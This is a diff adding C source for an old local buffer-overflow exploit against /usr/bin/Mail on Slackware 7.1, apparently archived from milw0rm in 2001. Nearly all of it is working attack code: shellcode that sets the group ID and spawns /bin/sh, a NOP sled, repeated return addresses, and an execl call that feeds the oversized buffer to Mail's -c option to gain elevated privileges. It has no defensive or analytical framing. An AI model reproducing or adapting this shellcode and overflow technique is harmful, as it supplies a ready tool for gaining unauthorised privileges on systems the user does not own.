@@ -1,0 +1,50 @@
+/*
+   Slackware 7.1 /usr/bin/Mail Exploit give gid=1 ( bin )
+   if /usr/bin/Mail is setgid but it is not setgid,
+   setuid for default.
+
+  tested on my box ( sl 7.1 )
+  crazy exploited by kengz.
+  GID.... \x01 = 1 (bin)
+          \x02 = 2 ,
+          \x03 = 3 ,
+     ...  \x0a = 10
+          \x0b = 11
+    ....
+*/
+
+#include <stdio.h>
+#include <string.h>
+#define GID    "\x03"
+
+int main(int argc, char **argv) {
+  char shellcode[] =
+    "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1"GID"\x31"
+    "\xc0\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3"GID"\xb1"
+     GID"\x31\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76"
+    "\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
+    "\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
+    "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+  char buf2[10000];
+  char buffer[15000];
+  char nop[8000];
+  char *p, *q;
+  long ret=0xbfffffff;
+  int len, offset = 0, i,j,k,ii;
+  ret = ret - 5000;
+
+  for(k=0; k<2000; k+=4)
+    *(long *)&buf2[k] = ret;
+
+  for(k=0;k<7000;k++){
+    strcat(nop,"\x90");
+  }
+  snprintf(buffer,12000,"%s%s%s",nop,shellcode,buf2);
+  printf("Crazy Mail sploit by kengz \n");
+  printf("Hit    '  .  ' to go \n");
+  execl("/usr/bin/Mail","Mail","x","-s","x","-c",buffer,0);
+}
+
+
+// milw0rm.com [2001-03-03]
